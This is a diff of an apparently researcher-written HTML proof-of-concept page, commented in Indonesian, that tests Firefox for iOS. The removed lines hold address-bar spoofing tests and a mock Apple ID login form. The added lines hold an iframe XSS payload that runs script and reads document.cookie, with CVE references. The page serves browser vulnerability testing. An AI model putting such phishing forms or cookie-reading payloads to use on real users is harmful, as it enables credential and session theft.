@@ -1,100 +1,56 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Firefox iOS - URL Spoof via Redirect PoC</title>
-    <meta charset="UTF-8">
+    <title>Firefox iOS - Content-Disposition XSS PoC</title>
 </head>
 <body>
-    <h1>Firefox iOS URL Spoofing PoC</h1>
-    <p>Menguji apakah address bar bisa dipalsukan via redirect ke non-HTTP scheme</p>
+    <h1>Firefox iOS Content-Disposition Bypass PoC</h1>
+    <p>Menguji apakah Firefox iOS mengabaikan Content-Disposition: Attachment header</p>
     
-    <h2>Test 1: Redirect ke internal error page</h2>
-    <button onclick="test1()" style="padding:10px;margin:5px;">
-        Test Redirect Spoof
+    <h2>Test: HTML dirender inline padahal seharusnya di-download</h2>
+    <button onclick="testContentDisposition()" style="padding:15px;font-size:16px;">
+        Load Test Payload
     </button>
     
-    <h2>Test 2: Spoofed form login</h2>
-    <button onclick="test2()" style="padding:10px;margin:5px;">
-        Test Fake Login Page
-    </button>
-    
-    <h2>Test 3: Iframe injection test</h2>
-    <button onclick="test3()" style="padding:10px;margin:5px;">
-        Test Iframe Spoof
-    </button>
-    
-    <div id="result" style="margin-top:20px;padding:15px;border:1px solid #ccc;min-height:50px;">
-        Hasil akan muncul di sini...
-    </div>
+    <!-- Hidden iframe untuk test -->
+    <iframe id="testFrame" style="width:100%;height:300px;border:1px solid black;margin-top:15px;"></iframe>
     
     <script>
-        function test1() {
-            // Mencoba redirect ke URL non-standar yang bisa menyebabkan
-            // address bar menampilkan URL yang salah
-            var iframe = document.createElement('iframe');
-            iframe.style.width = '100%';
-            iframe.style.height = '200px';
-            iframe.src = 'javascript:"<h1>Spoofed Content</h1><p>Address bar shows different URL</p>"';
-            document.getElementById('result').innerHTML = '';
-            document.getElementById('result').appendChild(iframe);
-        }
-        
-        function test2() {
-            // Membuat halaman login palsu untuk menguji apakah 
-            // bisa ditampilkan dengan URL yang tampak legitimate
-            var content = `
-                <div style="font-family:sans-serif;text-align:center;padding:40px;">
-                    <h2>Sign In - Apple ID</h2>
-                    <p style="color:gray;font-size:12px;">firefox-ios-poc.local</p>
-                    <input type="text" placeholder="Apple ID" style="width:200px;padding:8px;margin:5px;"><br>
-                    <input type="password" placeholder="Password" style="width:200px;padding:8px;margin:5px;"><br>
-                    <button style="padding:10px 30px;background:#007AFF;color:white;border:none;border-radius:5px;">
-                        Sign In
-                    </button>
-                    <p style="font-size:11px;color:red;">PoC - Do not enter real credentials!</p>
-                </div>
+        function testContentDisposition() {
+            var iframe = document.getElementById('testFrame');
+            
+            // Simulasi: konten yang seharusnya attachment/di-download
+            // tapi dirender inline
+            var payload = `
+                <html>
+                <head><title>Malicious Downloaded File</title></head>
+                <body style="font-family:sans-serif;">
+                    <h1 style="color:red;">⚠️ XSS Test Payload</h1>
+                    <p>File ini seharusnya <strong>di-download</strong> (Content-Disposition: attachment)</p>
+                    <p>Tapi Firefox iOS menampilkannya <strong>inline</strong></p>
+                    
+                    <div style="border:2px solid red;padding:20px;margin:20px;background:#ffeeee;">
+                        <h2>Cross-Site Scripting (XSS) Test</h2>
+                        <p id="xssTest">Menunggu eksekusi...</p>
+                        <script>
+                            document.getElementById('xssTest').innerHTML = 
+                                '<span style="color:red;font-weight:bold;">XSS BERHASIL! ' +
+                                'Skrip JavaScript dieksekusi dalam konteks halaman</span>';
+                            
+                            // Coba baca cookie (akan kosong di iframe, tapi PoC)
+                            document.getElementById('xssTest').innerHTML += 
+                                '<br>Document.cookie: ' + (document.cookie || '(empty/httponly)');
+                        <\/script>
+                    </div>
+                    
+                    <p><strong>Referensi:</strong> CVE-2025-55030 - Content-Disposition headers 
+                    incorrectly ignored for some MIME types</p>
+                </body>
+                </html>
             `;
             
-            var iframe = document.createElement('iframe');
-            iframe.style.width = '100%';
-            iframe.style.height = '300px';
-            iframe.srcdoc = content;
-            document.getElementById('result').innerHTML = '';
-            document.getElementById('result').appendChild(iframe);
-        }
-        
-        function test3() {
-            // Menguji desinkronisasi address bar vs konten
-            var url = window.location.href;
-            var fakeUrl = url.replace('poc', 'google.com');
-            
-            var content = `
-                <div style="padding:20px;text-align:center;">
-                    <h1>Address Bar Spoof Test</h1>
-                    <p>Actual URL: <code>${url}</code></p>
-                    <p>But content below is loaded from this PoC page, not from the displayed domain.</p>
-                    <p style="color:red;font-size:13px;">
-                        If address bar shows something other than this page's domain, 
-                        the spoof works!
-                    </p>
-                </div>
-            `;
-            
-            var iframe = document.createElement('iframe');
-            iframe.style.width = '100%';
-            iframe.style.height = '200px';
-            iframe.srcdoc = content;
-            document.getElementById('result').innerHTML = '';
-            document.getElementById('result').appendChild(iframe);
+            iframe.srcdoc = payload;
         }
     </script>
-    
-    <h2>Bug yang Diuji:</h2>
-    <ul>
-        <li><strong>CVE-2025-27426</strong> - URL spoofing via server-side redirect ke internal error page</li>
-        <li><strong>CVE-2025-27424</strong> - Address bar spoofing via non-HTTP scheme redirect</li>
-        <li><strong>CVE-2026-2634</strong> - Desinkronisasi address bar dan konten</li>
-        <li><strong>CVE-2026-2032</strong> - Interupsi loading halaman baru</li>
-    </ul>
 </body>
 </html>
